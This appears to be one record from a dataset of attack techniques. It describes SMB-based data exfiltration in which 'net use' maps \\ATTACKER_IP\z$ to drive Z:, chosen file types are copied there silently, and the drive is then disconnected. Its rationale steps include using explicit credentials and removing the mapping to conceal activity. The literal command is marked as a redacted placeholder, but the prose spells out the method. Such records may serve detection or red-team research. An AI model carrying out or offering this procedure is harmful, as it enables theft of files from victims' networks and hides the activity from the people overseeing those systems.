command: [REDACTED: Non-executable placeholder] Drive-mapped exfil: use 'net use Z:' to map \\ATTACKER_IP\z$, then recursively copy filtered file types to Z: silently, and disconnect the drive.
explanation: Demonstrates using a drive letter mapping via 'net use' to silently transfer targeted file types to a remote SMB share in an automated fashion.
rationale_steps: Map an SMB share to a drive letter using net use with explicit credentials
Filter and copy selected files to the mapped drive without prompts
Optionally track transferred items to avoid duplication
Remove the drive mapping to conceal activity
